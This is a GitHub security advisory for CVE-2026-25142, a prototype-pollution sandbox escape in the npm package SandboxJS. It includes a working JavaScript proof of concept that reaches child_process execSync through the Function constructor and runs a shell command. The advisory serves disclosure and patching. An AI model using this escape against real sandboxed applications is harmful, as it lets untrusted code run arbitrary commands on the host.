# [C] SandboxJS Vulnerable to Prototype Pollution -> Sandbox Escape -> RCE

## Summary
Severity: Critical
Advisory: GHSA-9p4w-fq8m-2hp7
CVE: CVE-2026-25142
CWE: CWE-1321, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-9p4w-fq8m-2hp7
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.27

## Details
### Summary

SandboxJS does not properly restrict `__lookupGetter__` which can be used to obtain prototypes, which can be used for escaping the sandbox / remote code execution.

### Details

https://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398

The Object prototype which contains `__lookupGetter__` is properly protected, but the special case for accessing function properties bypasses the prototype chain checks including the root Object prototype.

### PoC
```js
const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
let getProto = Object.toString.__lookupGetter__("__proto__")
let m = getProto.call(new Map());
m.has = isFinite;

console.log(
  isFinite.constructor(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);`
sb.compile(payload)().run();
```

### Impact
Prototype Pollution -> RCE

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-9p4w-fq8m-2hp7
- https://nvd.nist.gov/vuln/detail/CVE-2026-25142
- https://github.com/nyariv/SandboxJS/commit/75c8009db32e6829b0ad92ca13bf458178442bd3
- https://github.com/nyariv/SandboxJS
- https://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398
